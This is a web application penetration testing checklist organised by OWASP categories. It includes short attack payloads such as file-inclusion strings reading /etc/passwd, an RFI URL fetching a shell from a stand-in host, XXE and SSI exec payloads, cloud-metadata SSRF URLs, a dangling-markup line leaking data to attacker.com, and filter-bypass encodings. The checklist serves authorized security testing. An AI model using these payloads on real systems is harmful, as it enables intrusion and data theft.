Web Application Penetration Testing Checklist

This checklist provides a comprehensive guide for conducting penetration testing on web applications to ensure full security coverage. It covers information gathering, configuration management, identity management, authentication, authorization, session management, input validation, error handling, cryptography, business logic, client-side testing, and other advanced vulnerabilities, including obfuscation techniques to test filter bypasses. The checklist is aligned with OWASP Web Security Testing Guide, OWASP Top 10, OWASP API Security Top 10, and other industry standards, while addressing emerging threats like Web-specific SSRF, advanced XSS, OAuth misuses, and more.

Table of Contents
- [1. Information Gathering](#1-information-gathering)
- [2. Configuration & Deployment Management Testing](#2-configuration--deployment-management-testing)
- [3. Identity Management Testing](#3-identity-management-testing)
- [4. Authentication Testing](#4-authentication-testing)
- [5. Authorization Testing](#5-authorization-testing)
- [6. Session Management Testing](#6-session-management-testing)
- [7. Input Validation Testing](#7-input-validation-testing)
- [8. Error Handling Testing](#8-error-handling-testing)
- [9. Weak Cryptography Testing](#9-weak-cryptography-testing)
- [10. Business Logic Testing](#10-business-logic-testing)
- [11. Client-Side Testing](#11-client-side-testing)
- [12. Other Common Issues](#12-other-common-issues)
- [13. Obfuscation Techniques](#13-obfuscation-techniques)
- [14. Tools Recommended](#14-tools-recommended)
- [15. Best Practices](#15-best-practices)
- [16. References](#16-references)

1. Information Gathering

Objective: Collect data about the web application to identify attack vectors, technologies, and entry points.

### Open Source Reconnaissance
- [ ] Perform Google Dorks search for sensitive information
  - `site:*.target.com filetype:pdf`
  - `inurl:admin`
- [ ] Conduct OSINT using Shodan, Censys, or Maltego to identify exposed assets
- [ ] Search for exposed Git repositories or configuration files using GitHub Dorks
  - `org:target api_key`
- [ ] Check for exposed cloud metadata endpoints
  - AWS: `http://169.254.169.254/`

### Fingerprinting Web Server
- [ ] Identify web server type (Apache, Nginx) using WhatWeb or Netcat
- [ ] Determine server version via HTTP headers or error pages
- [ ] Check for outdated software with known CVEs using Nessus or OpenVAS
- [ ] Identify load balancers or CDNs (Cloudflare, Akamai) using Wappalyzer

### Looking for Metafiles
- [ ] Review `robots.txt` for hidden paths or sensitive endpoints
- [ ] Check `sitemap.xml` for site structure and entry points
- [ ] Inspect `humans.txt`, `security.txt`, and `.well-known/` for developer or security details
- [ ] Look for misconfigured files
  - `crossdomain.xml`
  - `clientaccesspolicy.xml`

### Enumerating Web Server's Applications
- [ ] Enumerate applications using Nmap scripts
  - `nmap --script http-enum <target>`
- [ ] Use Netcat to probe HTTP services for banners or responses
- [ ] Perform DNS lookup (`dig target.com`) and reverse DNS lookup (`dig -x <IP>`)
- [ ] Identify subdomains using Sublist3r, Amass, or DNS bruteforcing

### Review Web Contents
- [ ] Inspect page source for sensitive information (API keys, credentials in comments)
- [ ] Search for sensitive JavaScript code exposing endpoints or logic
- [ ] Check for hardcoded keys or secrets in JavaScript or WebAssembly (WASM) files
- [ ] Verify autocomplete is disabled on sensitive input fields (password fields)

### Identifying Application's Entry Points
- [ ] Identify HTTP methods (GET, POST, PUT, DELETE) using Burp Suite or curl
- [ ] Map where methods are used (forms, APIs, file uploads)
- [ ] Identify injection points (query parameters, headers, cookies, WebSockets)

### Mapping Execution Paths
- [ ] Use Burp Suite Spider or Crawler to map application endpoints
- [ ] Perform directory enumeration with Dirsearch or Gobuster
  - `dirsearch -u <target>`
- [ ] Document all accessible URLs, parameters, and WebSocket endpoints

### Fingerprint Web Application Framework
- [ ] Use Wappalyzer to identify frameworks (Django, Laravel, React, Angular)
- [ ] Run WhatWeb for detailed framework and CMS detection
- [ ] Check URL extensions (`.php`, `.asp`) for technology hints
- [ ] Review HTML source for framework-specific comments or tags
- [ ] Inspect cookie parameters and HTTP headers for framework signatures

### Map Application Architecture
- [ ] Map site structure (user vs. admin areas, API endpoints)
- [ ] Identify frontend, backend, database, and third-party integrations
  - Payment gateways
  - Single Sign-On (SSO)
  - GraphQL
- [ ] Document cloud infrastructure (AWS, Azure) and internal apps

2. Configuration & Deployment Management Testing

Objective: Identify misconfigurations in network, application, and file handling that could expose the application.

### Test Network Configuration
- [ ] Verify firewall rules and open ports using Nmap
  - `nmap -sV <target>`
- [ ] Check for default settings on web servers, load balancers, or CDNs
- [ ] Test for default credentials on network devices or management interfaces

### Test Application Configuration
- [ ] Ensure only required modules are enabled (disable unused Apache modules)
- [ ] Verify unwanted modules are disabled to reduce attack surface
- [ ] Test server resilience to Denial of Service (DoS) attacks (Slowloris)
- [ ] Check handling of 4xx/5xx errors for information disclosure
- [ ] Verify application runs with least privilege (non-root user)
- [ ] Inspect logs for sensitive information (API keys, user data)
- [ ] Test for misconfigured GraphQL introspection
  - `/graphql?query={__schema{types{name}}}`

### Test File Extension Handling
- [ ] Ensure server blocks sensitive extensions (`.bak`, `.config`)
- [ ] Test for acceptance of malicious extensions (`.php` in upload forms)
- [ ] Validate file upload mechanisms for type, size, and content restrictions

### Review Backup & Unreferenced Files
- [ ] Check for unreferenced files exposing sensitive data (`/backup.zip`)
- [ ] Verify naming conventions for backup files (avoid `site.bak`)
- [ ] Test functionality of unreferenced pages for hidden features

### Enumerate Infrastructure & Admin Interfaces
- [ ] Identify infrastructure interfaces
  - `/server-status`
  - `/phpinfo.php`
- [ ] Locate admin interfaces (`/admin`, `/login`) using directory enumeration
- [ ] Test for hidden admin functionalities via parameter tampering (`?admin=true`)

### Test HTTP Methods
- [ ] Discover supported methods using OPTIONS or curl
  - `curl -X OPTIONS <target>`
- [ ] Ensure PUT, DELETE, and OPTIONS are disabled unless required
- [ ] Test TRACE for Cross-Site Tracing (XST) attacks
- [ ] Check for method overriding (`X-HTTP-Method-Override`)

### Test HTTP Strict Transport Security (HSTS)
- [ ] Verify `Strict-Transport-Security` header is present with adequate duration
- [ ] Ensure HSTS includes subdomains and preload directives

### Test RIA Cross Domain Policy
- [ ] Check `crossdomain.xml` and `clientaccesspolicy.xml` for least privilege
- [ ] Verify no wildcard (*) policies for cross-domain access

### Test File Permission
- [ ] Ensure sensitive files (`config.php`) have restrictive permissions (`chmod 600`)
- [ ] Test for directory enumeration using Gobuster or Dirb

### Test for Subdomain Takeover
- [ ] Check DNS, A, CNAME, and NS records for dangling subdomains
- [ ] Test for subdomain takeover using tools like Subadub or Subjack
- [ ] Verify 404 responses for takeover risks

### Test Cloud Storage
- [ ] Check for misconfigured AWS S3 buckets
  - `aws s3 ls s3://bucket-name`
- [ ] Test Google Cloud Storage and Azure Blobs for public access
- [ ] Verify sensitive paths (`/private`) are not exposed
- [ ] Test for cloud metadata SSRF
  - `http://169.254.169.254/latest/meta-data/`

3. Identity Management Testing

Objective: Ensure proper role definitions and user provisioning to prevent unauthorized access.

### Test Role Definitions
- [ ] Test for forced browsing to restricted areas (`/admin`)
- [ ] Check for Insecure Direct Object Reference (IDOR) by manipulating IDs
  - Change `user_id=123` to `124`
- [ ] Test parameter tampering to access unauthorized resources
- [ ] Ensure low-privilege users cannot access high-privilege resources (admin panels)

### Test User Registration Process
- [ ] Verify users cannot register multiple times with the same identity
- [ ] Ensure email confirmation or CAPTCHA is required
- [ ] Check rejection of disposable email addresses using blocklists
- [ ] Validate proof required for registration (ID verification)

### Test Account Provisioning Process
- [ ] Verify provisioning/de-provisioning requires validation
- [ ] Check admin rights for provisioning other users
- [ ] Ensure users cannot de-provision themselves without authorization
- [ ] Verify de-provisioned user resources are inaccessible

### Test for Account Enumeration
- [ ] Compare responses for valid/invalid username-password combinations
- [ ] Ensure rate-limiting on login fields to prevent enumeration
- [ ] Check for username enumeration via error messages or timing differences

### Test for Weak Username Policy
- [ ] Verify responses for valid/invalid usernames
- [ ] Check for enumeration via timing or error differences

4. Authentication Testing

Objective: Secure authentication mechanisms to prevent unauthorized access or bypasses.

### Test for Un-Encrypted Channel
- [ ] Verify login, register, forgot password, and change password pages use HTTPS
- [ ] Check for HTTP resources post-logout or via forced browsing
- [ ] Test for mixed content issues (HTTP scripts on HTTPS pages)

### Test for Default Credentials
- [ ] Test default credentials
  - `admin:admin`
  - `guest:guest`
- [ ] Try organization names or predictable credentials
- [ ] Check for response manipulation or blank password fields
- [ ] Review page source for hardcoded credentials

### Test for Weak Lockout Mechanism
- [ ] Ensure accounts lock after 3-5 incorrect attempts
- [ ] Verify CAPTCHA validation and regeneration after failures
- [ ] Confirm recovery options for locked accounts (email reset)

### Test for Bypassing Authentication Schema
- [ ] Attempt forced browsing to internal dashboards without login
- [ ] Test session ID prediction or tampering
- [ ] Check for SQL injection on login pages using SQLmap
- [ ] Verify concurrent login restrictions
- [ ] Test OAuth misuses:
  - [ ] Implicit flow vulnerabilities (token leakage in URL)
  - [ ] Open redirect abuse in OAuth redirects

### Test for Vulnerable Remember Password
- [ ] Ensure stored passwords are encrypted and server-side
- [ ] Verify no sensitive data in client-side storage (localStorage)

### Test for Browser Cache Weakness
- [ ] Ensure `Cache-Control: no-store` and `Pragma: no-cache` on sensitive pages
- [ ] Verify no sensitive data in browser cache or history

### Test for Weak Password Policy
- [ ] Enforce strong passwords (≥12 characters, mixed case, symbols)
- [ ] Prevent username reuse or common passwords (`password123`)
- [ ] Verify minimum and maximum password length enforcement

### Test for Weak Security Questions
- [ ] Ensure questions are complex and resistant to brute-forcing
- [ ] Verify answers are not predictable or publicly available

### Test for Weak Password Reset Function
- [ ] Check information required for reset (email only)
- [ ] Ensure HTTPS and unique, expiring tokens for resets
- [ ] Test rate-limiting on reset requests
- [ ] Verify token randomness using Burp Sequencer

### Test for Weak Password Change Function
- [ ] Verify old password is required for changes
- [ ] Ensure other sessions are invalidated post-change
- [ ] Check for blank password vulnerabilities

### Test for Weak Authentication in Alternative Channels
- [ ] Test authentication across desktop/mobile browsers, regions, and languages
- [ ] Verify consistency in desktop/mobile apps and WebSocket-based auth

5. Authorization Testing

Objective: Prevent unauthorized access to resources or functions.

### Test Directory Traversal/File Include
- [ ] Identify URL or cookie-based injection points
- [ ] Test Local File Inclusion (LFI)
  - `../../etc/passwd%00`
- [ ] Test Remote File Inclusion (RFI)
  - `http://malicious.com/shell.php`
- [ ] Apply obfuscation:
  - [ ] Base64 encoding (`L2V0Yy9wYXNzd2Q=`)
  - [ ] URL encoding (`%2e%2e%2f`)
  - [ ] ASCII, HTML, Hex, Binary, Octal, or Gzip encoding
  - [ ] Double encoding (`%252e%252e%252f`)
  - [ ] Special characters or null bytes (`%00`)

### Test Traversal with Different OS Schemes
- [ ] Test Unix paths (`/etc/passwd`)
- [ ] Test Windows paths (`..\windows\system32`)
- [ ] Test Mac paths (`/Library/Preferences/`)

### Test Authorization Schema Bypass
- [ ] Test horizontal bypass (accessing another user's data)
- [ ] Test vertical bypass (user to admin access)
- [ ] Override with custom headers
  - `X-Forwarded-For`
  - `X-Custom-IP`

### Test for Privilege Escalation
- [ ] Identify injection points for privilege escalation
- [ ] Test forced browsing to high-privilege endpoints (`/admin/settings`)
- [ ] Manipulate parameters to gain elevated access

### Test for Insecure Direct Object Reference (IDOR)
- [ ] Change ID parameters (`user_id=123` to `124`)
- [ ] Add parameters or use outdated API versions
- [ ] Test HTTP parameter pollution (`user_id=123&user_id=124`)
- [ ] Wrap IDs in arrays (`user_id[]=123`) or JSON objects (`{"user_id":123}`)
- [ ] Test case changes, path traversal, or method swapping

6. Session Management Testing

Objective: Ensure secure session handling to prevent hijacking or unauthorized access.

### Test for Session Management Schema
- [ ] Verify `Set-Cookie` includes `Secure`, `HttpOnly`, and `SameSite=Strict` flags
- [ ] Ensure cookies are not transmitted over HTTP
- [ ] Check for persistent cookies or session fixation vulnerabilities
- [ ] Test session behavior post-logout or browser closure
- [ ] Decode cookies (Base64, Hex, URL) for sensitive data

### Test for Cookie Attributes
- [ ] Ensure cookies have `Secure`, `HttpOnly`, `Path`, and `SameSite` attributes
- [ ] Verify proper cookie expiration settings (short-lived sessions)

### Test for Session Fixation
- [ ] Ensure new cookies are issued post-authentication
- [ ] Test cookie manipulation for session takeover

### Test for Exposed Session Variables
- [ ] Verify session variables are encrypted
- [ ] Test GET/POST vulnerabilities for session ID exposure
- [ ] Check method interchange (POST to GET) for leaks

### Test for Back Refresh Attack
- [ ] Verify session invalidation after password change or logout
- [ ] Test back button functionality post-logout

### Test for Cross-Site Request Forgery (CSRF)
- [ ] Validate CSRF tokens server-side with full length checks
- [ ] Compare tokens across multiple accounts for uniqueness
- [ ] Test CSRF bypass:
  - [ ] Remove or modify tokens
  - [ ] Change content type to `multipart/form-data`
  - [ ] Alter referrer or host headers
  - [ ] Combine with clickjacking or dangling markup

### Test for Logout Functionality
- [ ] Verify logout works across all pages
- [ ] Ensure logout button is visible and sessions are terminated
- [ ] Prevent dashboard access via back button post-logout

### Test for Session Timeout
- [ ] Ensure sessions timeout after inactivity (15 minutes)
- [ ] Verify all tokens are destroyed post-timeout

### Test for Session Puzzling
- [ ] Identify session variables and test for logical flow disruptions

### Test for Session Hijacking
- [ ] Test on non-HSTS targets using captured cookies
- [ ] Attempt login with stolen session IDs via WebSockets or HTTP

7. Input Validation Testing

Objective: Prevent injection attacks through robust input validation and sanitization.

### Test for Reflected Cross-Site Scripting (XSS)
- [ ] Test with characters `<>'"&` and escape sequences
- [ ] Replace `<` and `>` with HTML entities (`&lt;`, `&gt;`)
- [ ] Use mixed case payloads (`<ScRiPt>`)
- [ ] Apply obfuscation:
  - [ ] Double encoding (`%253Cscript%253E`)
  - [ ] Recursive filters or anchor tags without whitespace
  - [ ] Replace whitespace with bullets, tabs, or Unicode characters
  - [ ] Use newlines (`\r\n`) to bypass regex filters

### Test for Stored Cross-Site Scripting (XSS)
- [ ] Identify stored input fields (profiles, comments, file uploads)
- [ ] Test with HTML tags or XSS payloads in filenames
- [ ] Check for XSS in settings, forums, or shopping carts

### Test for DOM-Based Cross-Site Scripting
- [ ] Identify DOM sinks (`document.write`, `eval`, `location.href`)
- [ ] Test payloads tailored to sinks (`javascript:alert(1)`)
- [ ] Test mutation XSS by manipulating DOM events (`onerror`, `onload`)
- [ ] Check for JavaScript prototype pollution (`__proto__.malicious=alert(1)`)
- [ ] Test Angular/React-specific XSS (`{{constructor.constructor('alert(1)')()}}`)

### Test for Content Security Policy (CSP) Bypasses
- [ ] Check CSP headers for weak policies (`unsafe-inline`, `unsafe-eval`)
- [ ] Test for dangling markup injection (`<img src="http://attacker.com?data=">`)
- [ ] Exploit JSONP endpoints to bypass CSP (`/jsonp?callback=malicious`)
- [ ] Test for missing or overly permissive `script-src` directives

### Test for HTTP Parameter Pollution
- [ ] Identify backend parsing methods (first/last parameter precedence)
- [ ] Test parameter pollution (`param=1&param=2`)
- [ ] Bypass filters using multiple parameters or malformed inputs

### Test for SQL Injection
- [ ] Test authentication forms, search bars, and editable fields
- [ ] Use SQLmap or manual payloads (`' OR 1=1 --`)
- [ ] Apply obfuscation:
  - [ ] URL encoding (`%27` for `'`)
  - [ ] Mixed case or null bytes (`%00`)
  - [ ] Time-based or Boolean-based queries (`SLEEP(5)`)
- [ ] Test GET, POST, COOKIE, and HEADER injections

### Test for LDAP Injection
- [ ] Use LDAP search filters (`*)(uid=*))`)
- [ ] Test for access control bypass via LDAP injection

### Test for XML Injection
- [ ] Check for XML processing and inject metacharacters (`<!ENTITY>`)
- [ ] Construct XSS or XXE payloads within XML

### Test for XML External Entity (XXE) Injection
- [ ] Test XML inputs for XXE
  - `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
- [ ] Attempt SSRF via XXE to access internal resources or cloud metadata

### Test for Server-Side Includes (SSI)
- [ ] Use Google Dorks to find SSI keywords (`<!--#include`)
- [ ] Test for RCE or other injections via SSI (`<!--#exec cmd="whoami" -->`)

### Test for XPath Injection
- [ ] Identify XPath injection points and test with payloads (`//user[1]`)

### Test for IMAP/SMTP Injection
- [ ] Identify injection points in email-related features
- [ ] Test for command execution or data exfiltration via IMAP/SMTP

### Test for Local File Inclusion (LFI)
- [ ] Test with LFI payloads (`../../etc/passwd%00`)
- [ ] Use obfuscation (null bytes, double encoding)

### Test for Remote File Inclusion (RFI)
- [ ] Test with remote URLs (`http://malicious.com/shell.php`)
- [ ] Apply encoding to bypass filters

### Test for Command Injection
- [ ] Identify injection points and test with delimiters (`;`, `&&`, `|`)
- [ ] Use OS-specific commands (`whoami`, `dir`)
- [ ] Test with obfuscated payloads (Base64-encoded commands)

### Test for Format String Injection
- [ ] Test with format specifiers (`%s`, `%n`)
- [ ] Assess impact on application stability or memory leaks

### Test for Host Header Injection
- [ ] Manipulate `Host` and `X-Forwarded-Host` headers
- [ ] Test password reset poisoning or cache poisoning
- [ ] Use obfuscation (duplicate headers, slashes)

### Test for Server-Side Request Forgery (SSRF)
- [ ] Identify SSRF keywords in headers or body (`url=`, `redirect=`)
- [ ] Test Web-specific SSRF:
  - [ ] Access cloud metadata (`http://169.254.169.254/latest/meta-data/` for AWS)
  - [ ] Target internal apps (`http://localhost:8080/admin`)
  - [ ] Use protocols like `file://`, `gopher://`, or `dict://`
- [ ] Apply obfuscation (URL encoding, IP address in decimal format)

### Test for Server-Side Template Injection (SSTI)
- [ ] Identify template engines (Jinja2, Twig, FreeMarker)
- [ ] Test with payloads (`{{7*7}}` for Jinja2)
- [ ] Use tplmap to exploit SSTI vulnerabilities

### Test for Deserialization Vulnerabilities
- [ ] Identify deserialization points (Java, PHP, .NET objects)
- [ ] Test for insecure deserialization using tools like ysoserial
- [ ] Attempt RCE or data tampering via crafted objects

8. Error Handling Testing

Objective: Ensure errors do not expose sensitive information or destabilize the application.

### Test for Improper Error Handling
- [ ] Trigger errors via URL parameter manipulation or invalid inputs
- [ ] Upload unrecognized file formats to check error responses
- [ ] Analyze error outputs for stack traces, database details, or version info
- [ ] Test all possible error conditions (500, 404, timeout errors)

9. Weak Cryptography Testing

Objective: Ensure strong cryptographic practices to protect data in transit and at rest.

### Test for Weak Transport Layer Security
- [ ] Test for DROWN (SSLv2), POODLE (SSLv3), BEAST (TLS 1.0)
- [ ] Check for FREAK (export ciphers), NOMORE (RC4), CRIME (TLS compression), LOGJAM (DHE keys)
- [ ] Verify certificates use ≥2048-bit keys and SHA-256 (no MD5/SHA-1)
- [ ] Ensure certificate validity and proper chain of trust
- [ ] Test for weak or null cipher suites using SSLyze or testssl.sh

### Test for Weak Data Encryption
- [ ] Check for insecure storage of sensitive data (plaintext passwords)
- [ ] Verify encryption of cookies, tokens, or session data

10. Business Logic Testing

Objective: Identify flaws in application logic that could be exploited.

### Test for Business Logic
- [ ] Map application logic and button functionalities
- [ ] Test with high/negative numerical values (quantities, prices)
- [ ] Manipulate payment flows or parameters for unauthorized actions
- [ ] Test for race conditions (time-of-check/time-of-use in payments)

### Test for Malicious File Upload
- [ ] Upload malicious files (`.php`, `.exe`) or files with XSS/RCE payloads
- [ ] Test right-to-left override (`malicious.txt.exe`)
- [ ] Embed payloads in filenames or within images (using bmp.pl)
- [ ] Test large file uploads for DoS vulnerabilities

11. Client-Side Testing

Objective: Secure client-side components against attacks like XSS or clickjacking.

### Test for DOM-Based Cross-Site Scripting
- [ ] Identify DOM sinks (`document.write`, `eval`, `location.href`)
- [ ] Test payloads for sinks (`javascript:alert(1)`)
- [ ] Test mutation XSS via DOM events (`onerror`, `onload`)
- [ ] Test framework-specific XSS (Angular: `{{constructor.constructor('alert(1)')()}}`)
- [ ] Test JavaScript prototype pollution (`__proto__.malicious=alert(1)`)

### Test for URL Redirect
- [ ] Check for open redirect parameters (`?url=http://malicious.com`)
- [ ] Test with whitelisted domains, subdomains, or XSS payloads
- [ ] Combine with OAuth redirect abuse (stealing authorization codes)

### Test for Cross-Origin Resource Sharing (CORS)
- [ ] Verify `Access-Control-Allow-Origin` settings (no wildcard *)
- [ ] Exploit misconfigured CORS with HTML PoC
- [ ] Test CORS in HTML5 WebSocket implementations

### Test for Clickjacking
- [ ] Ensure `X-Frame-Options` is set to `DENY` or `SAMEORIGIN`
- [ ] Test with iframe-based PoC for clickjacking

### Test for HTML5 Attacks
- [ ] Test WebSocket misconfigurations (lack of origin validation)
- [ ] Check for Web Storage (localStorage, sessionStorage) misuse
- [ ] Test for Web Messaging (postMessage) vulnerabilities
- [ ] Verify WebAssembly (WASM) modules do not expose sensitive functions

12. Other Common Issues

Objective: Address additional and emerging vulnerabilities.

### Test for No-Rate Limiting
- [ ] Verify rate limiting on sensitive actions (login, password reset)
- [ ] Bypass rate limits using:
  - [ ] Case changes in endpoints (`/Login` vs. `/login`)
  - [ ] Trailing slashes, null bytes (`%00`), or Unicode characters
  - [ ] IP rotation, race conditions, or concurrent requests
  - [ ] Duplicate/custom headers (`Origin`, `X-Forwarded-For`)

### Test for EXIF Geodata
- [ ] Ensure EXIF data is stripped from uploaded images
- [ ] Use tools like ExifTool to verify metadata removal

### Test for Broken Link Hijacking
- [ ] Identify broken links using blc (Broken Link Checker)
- [ ] Check for exploitable external links or redirects

### Test for Sender Policy Framework (SPF)
- [ ] Verify SPF records using nslookup or dig
- [ ] Ensure proper email sender validation to prevent spoofing

### Test for Weak Two-Factor Authentication (2FA)
- [ ] Test 2FA bypass via:
  - [ ] Poor session management or OAuth flaws
  - [ ] Brute-forcing, response/status code manipulation
  - [ ] Null/empty entries or removing 2FA parameters
  - [ ] Changing boolean values (`2fa_enabled=false`)
  - [ ] Using activation links or stolen tokens

### Test for Weak One-Time Password (OTP) Implementation
- [ ] Test OTP reuse, brute-forcing, or null entries
- [ ] Verify OTP expiration (≤5 minutes) and uniqueness
- [ ] Check for response or status code manipulation

### Test for Web Cache Poisoning
- [ ] Manipulate headers (`X-Forwarded-Host`, `X-Cache`) to poison cache
- [ ] Test for cache key injection (appending query parameters)
- [ ] Verify cache invalidation for sensitive pages

### Test for HTTP Header Smuggling
- [ ] Test for header smuggling (`Transfer-Encoding: chunked` with `Content-Length`)
- [ ] Exploit discrepancies in proxy/server header parsing
- [ ] Combine with cache poisoning or SSRF

### Test for Supply Chain Attacks
- [ ] Check for vulnerable third-party JavaScript libraries (using Retire.js)
- [ ] Verify integrity of external scripts (Subresource Integrity - SRI)
- [ ] Test for compromised CDN-hosted resources

### Test for GraphQL Vulnerabilities
- [ ] Check for introspection queries (`__schema`, `__type`)
- [ ] Test for batch query abuse leading to DoS
- [ ] Verify access controls on GraphQL endpoints

13. Obfuscation Techniques

Objective: Test the application's ability to handle obfuscated inputs that may bypass filters.

### Encoding Techniques
- [ ] Use Base64, URL, ASCII, HTML, Hex, Binary, Octal, or Gzip encoding
- [ ] Apply double encoding (`%252e%252e%252f`) or encode special characters
- [ ] Test with null bytes (`%00`), newlines (`\r\n`), or Unicode characters

### Payload Obfuscation
- [ ] Mix case in payloads (`<ScRiPt>`)
- [ ] Replace whitespace with non-standard characters (bullets, tabs, Unicode)
- [ ] Use recursive encoding to bypass regex filters
- [ ] Wrap payloads in arrays (`[payload]`), JSON objects (`{"key":payload}`), or nested structures

### Method and Header Manipulation
- [ ] Change HTTP methods (POST to GET, HEAD to TRACE)
- [ ] Add/duplicate headers (`Host`, `X-Forwarded-Host`)
- [ ] Use malformed headers or parameters to confuse parsers
- [ ] Test IP address obfuscation (decimal or octet format for SSRF)

14. Tools 

### Reconnaissance
- Nmap
- Sublist3r
- Shodan
- Censys
- Maltego
- Amass

### Web Testing
- Burp Suite
- OWASP ZAP
- Nikto
- WhatWeb
- Wappalyzer

### Injection Testing
- SQLmap
- Hackbar
- Dirsearch
- Gobuster
- tplmap
- ysoserial

### Encoding/Obfuscation
- CyberChef
- Burp Suite Decoder

### Cloud Testing
- awscli
- ScoutSuite
- Prowler

### Broken Link Testing
- blc

### SSL/TLS Testing
- SSLyze
- testssl.sh

### JavaScript Analysis
- Retire.js
- JSPrime

### GraphQL Testing
- GraphQLmap
- InQL



15. References

- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [SecLists for payloads and wordlists](https://github.com/danielmiessler/SecLists)
- [NIST SP 800-115](https://csrc.nist.gov/publications/detail/sp/800-115/final)
